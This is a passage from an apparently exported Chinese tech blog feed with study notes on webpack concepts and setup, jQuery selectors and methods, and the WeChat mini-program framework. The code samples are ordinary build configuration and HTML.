loader 返回值给下一个 loader，在最后一个 loader，返回 webpack 所预期的 JavaScript。 loader 可以是同步的，也可以是异步的。 loader 运行在 Node.js 中，并且能够执行任何可能的操作。 loader 接收查询参数。用于对 loader 传递配置。 loader 也能够使用 options 对象进行配置。 除了使用 package.json 常见的 main 属性，还可以将普通的 npm 模块导出为 loader，做法是在 package.json 里定义一个 loader 字段。 插件(plugin)可以为 loader 带来更多特性。 loader 能够产生额外的任意文件。 插件(Plugins)插件是 wepback 的支柱功能，插件目的在于解决 loader 无法实现的其他事。 webpack 插件是一个具有 apply 属性的 JavaScript 对象。apply 属性会被 webpack compiler 调用，并且 compiler 对象可在整个编译生命周期访问。 ConsoleLogOnBuildWebpackPlugin.js123456789const pluginName = 'ConsoleLogOnBuildWebpackPlugin';class ConsoleLogOnBuildWebpackPlugin &#123; apply(compiler) &#123; compiler.hooks.run.tap(pluginName, compilation =&gt; &#123; console.log("webpack 构建过程开始！"); &#125;); &#125;&#125; compiler hook 的 tap 方法的第一个参数，应该是驼峰式命名的插件名称。建议为此使用一个常量，以便它可以在所有 hook 中复用。 配置由于插件可以携带参数/选项，必须在 webpack 配置中，向 plugins 属性传入 new 实例。 webpack.config.js12345678910111213141516171819202122232425const HtmlWebpackPlugin = require('html-webpack-plugin'); //通过 npm 安装const webpack = require('webpack'); //访问内置的插件const path = require('path');const config = &#123; entry: './path/to/my/entry/file.js', output: &#123; filename: 'my-first-webpack.bundle.js', path: path.resolve(__dirname, 'dist') &#125;, module: &#123; rules: [ &#123; test: /\.(js|jsx)$/, use: 'babel-loader' &#125; ] &#125;, plugins: [ new webpack.optimize.UglifyJsPlugin(), new HtmlWebpackPlugin(&#123;template: './src/index.html'&#125;) ]&#125;;module.exports = config; Node API注意：即便使用 Node API，用户也应该在配置中传入 plugins 属性。compiler.apply 并不是推荐的使用方式。 some-node-script.js123456789const webpack = require('webpack'); //访问 webpack 运行时(runtime)const configuration = require('./webpack.config.js');let compiler = webpack(configuration);compiler.apply(new webpack.ProgressPlugin());compiler.run(function(err, stats) &#123; // ...&#125;); 配置(Configuration)webpack 的配置文件，是导出一个对象的 JavaScript 文件,该导出对象由 webpack 根据对象定义的属性进行解析。 webpack 配置是标准的 Node.js CommonJS 模块： 通过 require(...) 导入其他文件 通过 require(...) 使用 npm 的工具函数 使用 JavaScript 控制流表达式，例如 ?: 操作符 对常用值使用常量或变量 编写并执行函数来生成部分配置 应避免以下做法: 在使用 webpack 命令行接口(CLI)（应该编写自己的命令行接口，或使用 --env）时，访问命令行接口(CLI)参数 导出不确定的值（调用 webpack 两次应该产生同样的输出文件） 编写很长的配置（应该将配置拆分为多个文件） 基本配置webpack.config.js12345678910var path = require('path');module.exports = &#123; mode: 'development', entry: './foo.js', output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'foo.bundle.js' &#125;&#125;; 多个 Target导出多个配置，当运行 webpack 时，所有的配置对象都会构建。123456789101112131415module.exports = [&#123; output: &#123; filename: './dist-amd.js', libraryTarget: 'amd' &#125;, entry: './app.js', mode: 'production',&#125;, &#123; output: &#123; filename: './dist-commonjs.js', libraryTarget: 'commonjs' &#125;, entry: './app.js', mode: 'production',&#125;] 使用其他配置语言webpack 接受以多种编程和数据语言编写的配置文件。使用 node-interpret，webpack 可以处理许多不同类型的配置文件。 模块(Modules)在模块化编程中，开发者将程序分解成离散功能块(discrete chunks of functionality)，并称之为模块。Node.js 从最一开始就支持模块化编程。然而，在 web，模块化的支持正缓慢到来。在 web 存在多种支持 JavaScript 模块化的工具。 webpack 模块对比 Node.js 模块，webpack 模块能够以各种方式表达它们的依赖关系： ES2015 import 语句 CommonJS require() 语句 AMD define 和 require 语句 css/sass/less 文件中的 @import 语句 样式(url(...))或 HTML 文件(&lt;img src=...&gt;)中的图片链接(image url) 注意： webpack 1 需要特定的 loader 来转换 ES 2015 import，然而通过 webpack 2 可以开箱即用。 支持的模块类型CoffeeScript、TypeScript、ESNext (Babel)、Sass、Less、Stylus。 webpack 通过 loader 可以支持各种语言和预处理器编写模块。loader 描述了 webpack 如何处理 非 JavaScript(non-JavaScript) 模块，并且在bundle中引入这些依赖。 模块解析(Module Resolution)resolver 是一个库(library)，用于帮助找到引入模块的绝对路径。当打包模块时，webpack 使用 enhanced-resolve 来解析文件路径。 webpack 中的解析规则使用 enhanced-resolve，webpack 能够解析三种文件路径： 绝对路径123import "/home/me/file";import "C:\\Users\\me\\file"; 相对路径12import "../src/file1";import "./file2"; 此时，使用 import 或 require 的资源文件(resource file)所在的目录被认为是上下文目录(context directory)。在 import/require 中给定的相对路径，会添加此上下文路径(context path)，以产生模块的绝对路径(absolute path)。 模块路径12import "module";import "module/lib/file"; 模块将在 resolve.modules 中指定的所有目录内搜索。 可以替换初始模块路径，此替换路径通过使用 resolve.alias 配置选项来创建一个别名。 接下来，解析器(resolver)将检查路径是否指向文件或目录。如果路径指向一个文件： 如果路径具有文件扩展名，则被直接将文件打包。 否则，将使用 [resolve.extensions] 选项作为文件扩展名来解析，此选项告诉解析器在解析中能够接受哪些扩展名（例如 .js, .jsx） 如果路径指向一个文件夹，则采取以下步骤找到具有正确扩展名的正确文件： 如果文件夹中包含 package.json 文件，则按照顺序查找 resolve.mainFields 配置选项中指定的字段，并且 package.json 中的第一个这样的字段确定文件路径 如果 package.json 文件不存在或者 package.json 文件中的 main 字段没有返回一个有效路径，则按照顺序查找 resolve.mainFiles 配置选项中指定的文件名，看是否能在 import/require 目录下匹配到一个存在的文件名。 文件扩展名通过 resolve.extensions 选项采用类似的方法进行解析。 解析 Loader(Resolving Loaders)Loader 解析遵循与文件解析器指定的规则相同的规则。但是 resolveLoader 配置选项可以用来为 Loader 提供独立的解析规则。 缓存每个文件系统访问都被缓存，以便更快触发对同一文件的多个并行或串行请求。在观察模式下，只有修改过的文件会从缓存中摘出。如果关闭观察模式，在每次编译前清理缓存。 依赖图(Dependency Graph)一个文件依赖于另一个文件，webpack 就把此视为文件之间有依赖关系。这使得 webpack 可以接收非代码资源(non-code asset)（例如图像或 web 字体），并且可以把它们作为依赖提供给你的应用程序。 webpack 从命令行或配置文件中定义的一个模块列表开始，处理你的应用程序。 从这些入口起点开始，webpack 递归地构建一个依赖图，这个依赖图包含着应用程序所需的每个模块，然后将所有这些模块打包为少量的 bundle (通常只有一个)可由浏览器加载。 补充：对于 HTTP/1.1 客户端，由 webpack 打包你的应用程序会尤其强大，因为在浏览器发起一个新请求时，它能够减少应用程序必须等待的时间。对于 HTTP/2，你还可以使用代码拆分(Code Splitting)以及通过 webpack 打包来实现最佳优化。 Manifest在使用 webpack 构建的典型应用程序或站点中，有三种主要的代码类型： 你或你的团队编写的源码。 你的源码会依赖的任何第三方的 library 或 “vendor” 代码。 webpack 的 runtime 和 manifest，管理所有模块的交互。 Runtimeruntime，以及伴随的 manifest 数据，主要是指：在浏览器运行时，webpack 用来连接模块化的应用程序的所有代码。 runtime 包含：在模块交互时，连接模块所需的加载和解析逻辑。包括浏览器中的已加载模块的连接，以及懒加载模块的执行逻辑。 Manifest当编译器(compiler)开始执行、解析和映射应用程序时，Manifest会保留所有模块的详细要点，这个数据集合称为 “Manifest”，当完成打包并发送到浏览器时，会在运行时通过 Manifest 来解析和加载模块。 无论你选择哪种模块语法，那些 import 或 require 语句现在都已经转换为 __webpack_require__ 方法，此方法指向模块标识符(module identifier)。通过使用 manifest 中的数据，runtime 将能够查询模块标识符，检索出背后对应的模块。 缓存优化通过manifest，使用浏览器缓存来改善项目的性能。 通过使用 bundle 计算出内容散列(content hash)作为文件名称，这样在内容或文件修改时，浏览器中将通过新的内容散列指向新的文件，从而使缓存无效。 构建目标(Targets)因为服务器和浏览器代码都可以用 JavaScript 编写，所以 webpack 提供了多种构建目标(target)。 用法webpack.config.js123module.exports = &#123; target: 'node'&#125;; 使用 node webpack 会编译为用于「类 Node.js」环境（使用 Node.js 的 require ，而不是使用任意内置模块（如 fs 或 path）来加载 chunk）。 多个 Targetwebpack 不支持向 target 传入多个字符串，可以通过打包两份分离的配置来创建同构的库:1234567891011121314151617181920var path = require('path');var serverConfig = &#123; target: 'node', output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'lib.node.js' &#125; //…&#125;;var clientConfig = &#123; target: 'web', // &lt;=== 默认是 'web'，可省略 output: &#123; path: path.resolve(__dirname, 'dist'), filename: 'lib.js' &#125; //…&#125;;module.exports = [ serverConfig, clientConfig ]; 模块热替换(Hot Module Replacement)模块热替换(HMR - Hot Module Replacement)功能会在应用程序运行过程中替换、添加或删除模块，而无需重新加载整个页面。主要是通过以下几种方式，来显著加快开发速度： 保留在完全重新加载页面时丢失的应用程序状态。 只更新变更内容，以节省宝贵的开发时间。 调整样式更加快速 - 几乎相当于在浏览器调试器中更改样式。 在应用程序中通过以下步骤，可以做到在应用程序中置换(swap in and out)模块： 1.应用程序代码要求 HMR runtime 检查更新。 2.HMR runtime（异步）下载更新，然后通知应用程序代码。 3.应用程序代码要求 HMR runtime 应用更新。 4.HMR runtime（异步）应用更新。 可以设置 HMR，以使此进程自动触发更新，或者你可以选择要求在用户交互时进行更新。 在编译器中除了普通资源，编译器(compiler)需要发出 “update”，以允许更新之前的版本到新的版本。”update” 由两部分组成： 1.更新后的 manifest(JSON) 2.一个或多个更新后的 chunk (JavaScript) manifest 包括新的编译 hash 和所有的待更新 chunk 目录。每个更新 chunk 都含有对应于此 chunk 的全部更新模块（或一个 flag 用于表明此模块要被移除）的代码。 编译器确保模块 ID 和 chunk ID 在这些构建之间保持一致。通常将这些 ID 存储在内存中（例如，使用 webpack-dev-server 时），但是也可能将它们存储在一个 JSON 文件中。 在模块中HMR 是可选功能，只会影响包含 HMR 代码的模块。举个例子，通过 style-loader 为 style 样式追加补丁。 为了运行追加补丁，style-loader 实现了 HMR 接口；当它通过 HMR 接收到更新，它会使用新的样式替换旧的样式。 类似的，当在一个模块中实现了 HMR 接口，你可以描述出当模块被更新后发生了什么。然而在多数情况下，不需要强制在每个模块中写入 HMR 代码。如果一个模块没有 HMR 处理函数，更新就会冒泡。这意味着一个简单的处理函数能够对整个模块树(complete module tree)进行更新。如果在这个模块树中，一个单独的模块被更新，那么整组依赖模块都会被重新加载。 在 HMR Runtime 中对于模块系统的 runtime，附加的代码被发送到 parents 和 children 跟踪模块。在管理方面，runtime 支持两个方法 check 和 apply。 check 发送 HTTP 请求来更新 manifest。如果请求失败，说明没有可用更新。如果请求成功，待更新 chunk 会和当前加载过的 chunk 进行比较。对每个加载过的 chunk，会下载相对应的待更新 chunk。当所有待更新 chunk 完成下载，就会准备切换到 ready 状态。 apply 方法将所有被更新模块标记为无效。对于每个无效模块，都需要在模块中有一个更新处理函数，或者在它的父级模块们中有更新处理函数。否则，无效标记冒泡，并也使父级无效。每个冒泡继续直到到达应用程序入口起点，或者到达带有更新处理函数的模块（以最先到达为准）。如果它从入口起点开始冒泡，则此过程失败。 之后，所有无效模块都被（通过 dispose 处理函数）处理和解除加载。然后更新当前 hash，并且调用所有 “accept” 处理函数。runtime 切换回闲置状态，一切照常继续。 在开发过程中，可以将 HMR 作为 LiveReload 的替代。webpack-dev-server 支持 hot 模式，在试图重新加载整个页面之前，热模式会尝试使用 HMR 来更新。]]></content>
      <categories>
        <category>Webpack</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[(一)Webpack入门总结]]></title>
    <url>%2F2018%2F05%2F14%2Fwebpack-start-first%2F</url>
    <content type="text"><![CDATA[关于webpck基本使用的入门总结。webpack版本【webpack@4.8.3】 补充：(1)git bash新建文件的命令：touch index.html（再别忘记了！！！） 入门下载安装及配置(Basic Setup)例如在桌面新建一个目录，使用npm初始化，然后利用npm命令本地安装webpack，再安装webpack-cli(用于在命令行上运行webpack的工具)： 123mkdir webpack-demo &amp;&amp; cd webpack-demonpm init -ynpm install webpack webpack-cli --save-dev 其中npm init -y表示在初始化创建package.json的过程中跳过提问阶段，直接生成一个新的package.json文件,类似的npm init -f也会跳过提问阶段。 npm初始化语法：npm init [--force|-f|--yes|-y|--scope] 在项目的根目录下，及webpack-demo下创建以下目录结构，具体目录结构及相应文件内容如下： 项目目录结构 src/index.js 123456789101112function component() &#123; var element = document.createElement('div'); // 借助了Lodash(一个js工具库，作用是降低array、number、object等使用难度)， // _ 是假定存在的一个Lodash全局对象，将js方法挂载在 _ 这个全局对象变量上。 element.innerHTML = _.join(['Hello','webpack'],' '); return element;&#125;document.body.appendChild(component()); index.html 12345678910111213&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Getting Started&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src="https://unpkg.com/lodash@4.16.6"&gt;&lt;/script&gt; &lt;script src="./src/index.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 修改package.json文件，增加private字段使我们的包私有化，同时删除main字段。这是为了防止意外发布我们的代码。更多关于package.json的内部机制见npm文档 , package.json修改如下： package.json 12345678910111213141516&#123; "name": "webpack-demo", "version": "1.0.0", "description": "", "private": true, "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1" &#125;, "keywords": [], "author": "", "license": "ISC", "devDependencies": &#123; "webpack": "4.8.3", "webpack-cli": "2.1.3" &#125;&#125; index.html中的&lt;script&gt;标签之间存在隐式依赖关系，index.js的运行依赖于lodash。虽然index.js没有显式声明与lodash的关系，但它假设全局变量 _ 存在。 上述方式管理javascript项目存在的问题： 脚本对于外部库的依赖并不是显而易见的。(index.js没有显式声明与lodash的关系，假设全局变量 _ 存在，表明index.js调用了lodash库) 如果依赖缺失或引入顺序有误，应用程序将无法运行。 如果引入的依赖并未使用，浏览器将下载不必要的代码。 接下来使用webpack来管理脚本。 创建一个捆绑(Creating a Bundle)首先调整目录结构，将“源”代码（/src）与“分发”代码（/dist）分开。“源代码”是需要编写和编辑的代码，“分发”代码是构建过程的最小化和最优输出，并且最终将在浏览器中加载。修改后的目录结构如下： 目录结构 为了捆绑lodash与index.js之间的依赖关系，需要在本地安装lodash库，命令如下：npm install --save lodash。 注意： 安装生产环境中用到的包时，需要使用npm install --save，开发环境时，使用npm install --save-dev。 接下来就可以在脚本中引入lodash，如下： src/index.js12345678910111213import _ from 'lodash';function component() &#123; var element = document.createElement('div'); // lodash,通过此脚本引入 element.innerHTML = _.join(['Hello','webpack'],' '); return element;&#125;document.body.appendChild(component()); 接下来需要更新index.html文件，首先去掉包含lodash的&lt;script&gt;标签，因为在index.js文件中通过import引入过了，然后修改另一个&lt;script&gt;标签来加载捆绑代替原来的/src文件： dist/index.html1234567891011121314&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Getting Started&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- &lt;script src="https://unpkg.com/lodash@4.16.6"&gt;&lt;/script&gt; --&gt; &lt;!-- &lt;script src="./src/index.js"&gt;&lt;/script&gt; --&gt; &lt;script src="bundle.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 设置中，index.js明确要求lodash存在，并以 _ （没有全局范围污染）绑定依赖关系。通过说明模块需要什么依赖关系，webpack可以使用这些信息来构建依赖关系图，然后使用该图生成一个优化的包，其中脚本将按正确的顺序执行。 运行npx webpack，以src/index.js脚本作为入口点，以bundle.js作为输出。npx命令：需要Node 8.2或更高版本，会运行webpack的二进制文件（./node_modules/.bin/webpack）。结果如下： 12345678910111213141516171819$ npx webpacknpx: 1 安装成功，用时 3.16 秒Path must be a string. Received undefinedC:\Users\Shirley\Desktop\webpack-demo\node_modules\webpack\bin\webpack.jsHash: ac9a5fb5c51baf1f8804Version: webpack 4.8.3Time: 3225msBuilt at: 2018-05-13 21:35:31 Asset Size Chunks Chunk Namesmain.js 70 KiB 0 [emitted] mainEntrypoint main = main.js[1] (webpack)/buildin/module.js 519 bytes &#123;0&#125; [built][2] (webpack)/buildin/global.js 509 bytes &#123;0&#125; [built][3] ./src/index.js 253 bytes &#123;0&#125; [built] + 1 hidden moduleWARNING in configurationThe 'mode' option has not been set, webpack will fallback to 'production' for this value. Set 'mode' option to 'development' or 'production' to enable defaults for each environment.You can also set it to 'none' to disable any default behavior. Learn more: https://webpack.js.org/concepts/mode/ 接下来在浏览器中打开index.html，如果打包成功会显示文本 ‘Hello webpack’。 注意踩坑！！！ 这里照着文档一步步来，发现浏览器没有文本内容，检查后发现，在index.html文件中引入打包后的脚本文件时示例代码给的打包脚本名字为bundle.js，但使用npx webpack生成的打包脚本名称为main.js,所以导致index.html文件没有正确的引入打包脚本文件。dist/index.html修改如下： 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt; &lt;meta http-equiv="X-UA-Compatible" content="ie=edge"&gt; &lt;title&gt;Getting Started&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;script src="main.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 上面的坑在英文文档中，后来看了中文文档发现中文的改过来了。。 打包后的目录结构如下： 模块(Modules)在ES2015中import和export声明已经标准化，尽管大部分浏览器还不支持，但webpack支持。 webpack实际上对ES2015语法进行了转码，通过查看node_modules目录可以看到webpack通过引入babel-preset-es2015来进行ES2015语法的转码。除了import和export，的webpackk支持各种其他模块语法。 注意： 除了import和export声明，webpack不会改变其他代码，如果要使用ES2015的其他特性，请确保通过webpack loader系统使用了像babel这样的转码器。 使用一个配置文件(Using a Configuration)在 webpack 4 中，可以无须任何配置使用，然而大多数项目会需要很复杂的设置，这就是为什么 webpack 仍然要支持 配置文件。这比在终端(terminal)中手动输入大量命令要高效的多，创建一个取代以上使用 CLI 选项方式的配置文件。 在项目根目录下创建webpack.config.js，用来配置webpack,内容如下： 123456789const path = require('path');module.exports = &#123; entry: './src/index.js', output: &#123; filename: 'main.js', path: path.resolve(__dirname, 'dist') &#125;&#125;; 通过新配置文件再次执行构建:npx webpack --config webpack.config.js。 注意： 如果 webpack.config.js 存在，则 webpack 命令将默认选择使用它。在这里使用 --config 选项只是表明，可以传递任何名称的配置文件，这对于需要拆分成多个文件的复杂配置是非常有用。 比起 CLI 这种简单直接的使用方式，配置文件具有更多的灵活性。可以通过配置方式指定 loader 规则、插件、解析选项，以及许多其他增强功能。 NPM 脚本(NPM Scripts)考虑到用 CLI 这种方式来运行本地的 webpack 不是特别方便，可以设置一个快捷方式，在 package.json 添加一个 npm 脚本(npm script)：1234567891011121314151617181920&#123; "name": "webpack-demo", "version": "1.0.0", "description": "", "private": true, "scripts": &#123; "test": "echo \"Error: no test specified\" &amp;&amp; exit 1", "build": "webpack" //此处为添加的npm脚本 &#125;, "keywords": [], "author": "", "license": "ISC", "devDependencies": &#123; "webpack": "4.8.3", "webpack-cli": "2.1.3" &#125;, "dependencies": &#123; "lodash": "4.17.10" &#125;&#125; 现在，可以使用 npm run build 命令，来替代之前使用的 npx webpack 命令生成打包脚本。 注意： 使用 npm 的 scripts，可以像使用 npx 那样通过模块名引用本地安装的 npm 包。这是大多数基于 npm 的项目遵循的标准，因为它允许所有贡献者使用同一组通用脚本（如果必要，每个 flag 都带有 --config 标志）。 注意： 通过向 npm run build 命令和你的参数之间添加两个中横线，可以将自定义参数传递给 webpack，例如：npm run build -- --colors。]]></content>
      <categories>
        <category>Webpack</category>
      </categories>
      <tags>
        <tag>Webpack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jQuery学习]]></title>
    <url>%2F2018%2F03%2F28%2FjQuery%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[JQuery是一个轻量级的JavaScript库。核心是JavaScript，不仅兼容CSS3，还兼容各种浏览器。 jQuery对象与DOM对象jQuery对象与DOM对象是不一样的。jQuery对象是一个类数组对象，而DOM对象就是一个单独的DOM元素。 如何把jQuery对象转成DOM对象？ (1)利用数组下标的方式读取到jQuery中的DOM对象 (2)通过jQuery自带的get()方法，例如`$div.get(0)。 DOM对象转化成jQuery对象 传递给$(DOM)函数的参数是一个DOM对象，jQuery方法会把这个DOM对象给包装成一个新的jQuery对象，就可以调用jQuery的方法了。 jQuery各种选择器id选择器： $(&quot;#id&quot;) 类选择器： $(&quot;.class&quot;) 元素选择器： $(&quot;element&quot;) 全选择器： $(&quot;*&quot;) 层级选择器： 子选择器$(&quot;parent &gt; child&quot;)、 后代选择器$(&quot;ancestor descendant&quot;)、 相邻兄弟选择器$(&quot;pre + next&quot;)、 一般兄弟选择器$(&quot;pre ~ siblings&quot;) 基本筛选选择器： 内容筛选选择器： 可见性筛选选择器： $(&quot;:visible&quot;)与$(&quot;:hidden&quot;)。:hidden选择器，不只包括display:none的元素，还包括隐藏表单、visibility等。 属性选择器： 子元素筛选选择器： 表单元素选择器: 表单对象属性筛选选择器: this选择器: $(&apos;p&apos;).click(function() { //将p元素转化为jQuery对象 var $this = $(this); $this.css(&apos;color&apos;, &apos;red&apos;); }); 操作jQuery DOM的方法1、 .attr()与.removeAttr() 2、 .html()及.text() 3、 .val()处理表单元素的值 4、 .addClass() .removeClass() 增加增加/删除类名改变样式 5、 .toggleClass() 切换样式 6、 .css() 样式操作 7、 .data() 数据存储，类似于原生DOM通过自定义属性data-来传递数据 8、 通过 $(&quot;html结构&quot;)创建节点 9、 .append()与 .appendTo()、 .prepend()与 .prependTo() DOM内部插入 10、 .after()与 .before()、 .insertAfter()与.insertBefore() DOM外部插入 11、 .empty()只清空指定元素所有子节点 12、 .remove() 会将自身也移除，可传递一个筛选表达式 13、 .detach() 临时删除页面上的节点，但是又不希望节点上的数据与事件丢失，事件及数据不删除，仅显示效果不在，在内存中还存在 14、 .clone() 克隆节点，深复制 15、 .replaceWith()和.replaceAll() DOM替换 16、 .wrap() /.wrapAll() 将元素用其他元素包裹起来，也就是给它增加一个父元素 17、 .unwrap() 将匹配元素集合的父级元素删除，保留自身（和兄弟元素，如果存在）在原来的位置 18、 .wrapInner() 将合集中的元素内部所有的子元素用其他元素包裹起来，并当作指定元素的子元素 19、 .children() 查找合集里面的第一级子元素 20、 .find() 查找后代元素 21、 .parent() 查找合集里面的每一个元素的父元素 22、 .parents() 查找合集里面的每一个元素的所有祖辈元素 23、 .closest() 查找当前元素的最近的父辈祖辈元素 24、 .next() 查找指定元素集合中每一个元素紧邻的后面同辈元素的元素集合 25、 .prev() 查找指定元素集合中每一个元素紧邻的前面同辈元素的元素集合 26、 .siblings() 查找指定元素集合中每一个元素的同辈元素 27、 .add() 用来创建一个新的jQuery对象 ，将元素添加到匹配的元素集合中 28、 .each() jQuery事件1、 click与dbclick 鼠标点击 $(&quot;#ele&quot;).click(function() { }); //传递数据进去 $(&quot;#ele&quot;).click([eventData,] function() { }); 2、 mousedown与mouseup、 mousemove、 mouseover与mouseout、 mouseenter与mouseleave 3、 hover 4、 focusin与focusout(支持冒泡)、 blur与focus(不支持冒泡) 5、 change 用于监听&lt;input&gt;元素，&lt;textarea&gt;和&lt;select&gt;元素的值 6、 select 当 textarea 或文本类型的 input 元素中的文本被选择时触发 7、 submit 8、 keydown()与keyup()、 keypress() 9、 on() 多事件绑定，所有的快捷事件在底层的处理都是通过一个”on”方法来实现。支持事件委托。 $(&quot;#ele&quot;).click(function() { //快捷方式 }); $(&quot;#ele&quot;).on(&apos;click&apos;, function() { //on方式 }); 10、 off() 卸载事件 11、 jQuery事件对象的属性和方法 event.type //获取事件类型 event.pageX 和event.pageY //获取鼠标当前相对于页面的坐标 event.preventDefault() //阻止默认行为 event.stopPropagation() //阻止事件冒泡 event.which //单击的鼠标的哪个键 event.currentTarget //在冒泡过程中的当前DOM元素 event.target //事件的目标DOM元素 12、 自定义事件 trigger(会冒泡)。 trigger除了能够触发浏览器事件，同时还支持自定义事件，并且自定义事件还支持传递参数。 13、 自定义事件 triggerHandler(不冒泡) 动画方法1、 .hide(“fast/slow”) 2、 .show() 3、 .toggle() 4、 .slideDown() 下拉动画 5、 .slideUp() 上卷动画 6、 .slideToggle() 上卷下拉切换 7、 .fadeIn()、 .fadeOut() 淡入淡出动画, opacity为0-1 8、 .fadeTo()可以到自定义的opacity 9、 .fadeToggle() 切换淡入淡出 10、 .animate() 动画 11、 .stop() 停止动画 其他常用方法1、 .inArray() 查找数组中的索引 $.inArray(value, array [, fromIndex]) 2、 .trim() 去空格 3、 .get() 单独操作合集中的的某一个元素，可以通过.get([index])方法获取到。 4、 .index() 从匹配的元素中搜索给定元素的索引值]]></content>
      <categories>
        <category>jQuery</category>
      </categories>
      <tags>
        <tag>jQuery</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[微信小程序开发文档总结]]></title>
    <url>%2F2018%2F03%2F26%2F%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%BC%80%E5%8F%91%E6%96%87%E6%A1%A3%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[小程序开发文档的简要概括。 基本的文件结构最关键也是必不可少的，是 app.js、app.json、app.wxss 这三个，.js后缀的是脚本文件，.json后缀的文件是配置文件，.wxss后缀的是样式表文件。 app.js： 是小程序的脚本代码。我们可以在这个文件中监听并处理小程序的生命周期函数、声明全局变量，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。 调用框架提供的丰富的 API，如本例的同步存储及同步读取本地数据。 app.json： 对整个小程序的全局配置。可以在这个文件中配置小程序是由哪些页面(&quot;pages&quot;)组成，配置小程序的窗口(&quot;window&quot;)背景色，配置导航条样式，配置默认标题。注意该文件不可添加任何注释。 app.wxss： 整个小程序的公共样式表。我们可以在页面组件的 class 属性上直接使用 app.wxss 中声明的样式规则。 创建页面小程序的页面都在根目录下的pages文件目录，例如一开始的示例程序中（有展示用户头像的欢迎页和小程序启动日志展示页），这两个页面都在pages目录下，即pages/index/和pages/logs/。 微信小程序中的每一个页面的【路径+页面名】都需要写在 app.json 的 &quot;pages&quot; 中，且 &quot;pages&quot; 中的第一个页面是小程序的首页。 1234"pages":[ "pages/index/index", "pages/logs/logs"], 每一个小程序页面是由同路径下同名的四个不同后缀文件的组成，如：index.js(脚本)、 index.wxml(页面结构)、 index.wxss(样式表)、 index.json(配置)。 index.wxml 是页面的结构文件。 index.js 是页面的脚本文件，在这个文件中我们可以监听并处理页面的生命周期函数、获取小程序实例，声明并处理数据，响应页面交互事件等。 index.wxss 是页面的样式表。 页面的样式表是非必要的。当有页面样式表时，页面的样式表中的样式规则会层叠覆盖 app.wxss 中的样式规则。如果不指定页面的样式表，也可以在页面的结构文件中直接使用 app.wxss 中指定的样式规则。 注意微信小程序开发中使用了新的尺寸单位，rpx(responsive pixel)，可以根据屏幕宽度自适应，规定屏幕宽度为750rpx。 如在 iPhone6 上，屏幕宽度为375px，共有750个物理像素，则750rpx = 375px = 750物理像素，1rpx = 0.5px = 1物理像素。微信官方建议视觉稿以iPhone 6为标准。(补充rem: 规定屏幕宽度为20rem，所以1rem=750/20 rpx) index.json 是页面的配置文件。 页面的配置文件是非必要的。当有页面的配置文件时，配置项在该页面会覆盖 app.json 的 window 中相同的配置项。如果没有指定的页面配置文件，则在该页面直接使用 app.json 中的默认配置。 文件目录安排如下所示如下图所示。 框架框架提供了自己的视图层描述语言WXML和WXSS，以及基于JavaScript的逻辑层框架，并在视图层与逻辑层间提供了数据传输和事件系统，可以让开发者可以方便的聚焦于数据与逻辑上。 响应的数据绑定 框架的核心是一个响应的数据绑定系统。整个系统分为两块视图层(View)和逻辑层(App Service)。框架可以让数据与视图非常简单地保持同步。当做数据修改的时候，只需要在逻辑层修改数据，视图层就会做相应的更新。 页面管理 框架管理了整个小程序的页面路由，可以做到页面间的无缝切换，并给以页面完整的生命周期。开发者需要做的只是将页面的数据，方法，生命周期函数注册进框架中，其他的一切复杂的操作都交由框架处理。 基础组件 框架提供了一套基础的组件，这些组件自带微信风格的样式以及特殊的逻辑，开发者可以通过组合基础组件，创建出强大的微信小程序 。 丰富的API 框架提供丰富的微信原生API，可以方便的调起微信提供的能力，如获取用户信息，本地存储，支付功能等。 配置使用app.json文件来对微信小程序进行全局配置，决定页面文件的路径、窗口表现、设置网络超时时间、设置多 tab 等。app.json的配置项列表包括： pages window tabBar networkTimeout debug。 pages ：接受一个数组，每一项都是字符串，来指定小程序由哪些页面组成。每一项代表对应页面的【路径+文件名】信息，数组的第一项代表小程序的初始页面。小程序中新增/减少页面，都需要对 pages 数组进行修改。 文件名不需要写文件后缀，因为框架会自动去寻找路径.json,.js,.wxml,.wxss的四个文件进行整合。 window： 用于设置小程序的状态栏、导航条、标题、窗口背景色。具体参数如下： tabBar： 如果我们的小程序是一个多 tab 应用（客户端窗口的底部有tab栏可以切换页面），那么我们可以通过 tabBar 配置项指定 tab 栏的表现，以及 tab 切换时显示的对应页面。 page.json： 每一个小程序页面也可以使用.json文件来对本页面的窗口表现进行配置。页面的配置比app.json全局配置简单得多，只是设置 app.json 中的 window 配置项的内容，页面中配置项会覆盖 app.json 的 window 中相同的配置项。页面的.json只能设置window相关的配置项，以决定本页面的窗口表现，所以无需写window这个键。 逻辑层(APP Service)小程序开发框架的逻辑层是由JavaScript编写。 逻辑层将数据进行处理后发送给视图层，同时接受视图层的事件反馈。 在javascript基础上，增加 App 和 Page 方法，进行程序和页面的注册； 提供丰富的 API，如扫一扫，支付等微信特有能力； 